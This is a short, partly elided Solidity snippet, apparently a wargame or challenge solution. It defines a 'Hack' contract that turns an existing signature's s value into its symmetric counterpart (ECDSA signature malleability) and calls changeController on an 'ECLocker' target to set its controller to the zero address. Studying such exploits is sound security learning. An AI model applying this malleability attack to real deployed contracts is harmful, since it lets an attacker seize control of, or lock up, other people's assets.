...
//note: you need to use your's instant signature
contract Hack {
    ECLocker immutable target;

    constructor(address _target) {
        target = ECLocker(_target);
    }

    function symmetrys(bytes32 s) public pure returns (bytes32) {
        return
            bytes32(
    ...
    function hack() public {
        ...
        bytes32 symmentrys = symmetrys(s);
        target.changeController(v, r, symmentrys, address(0));
    }
}
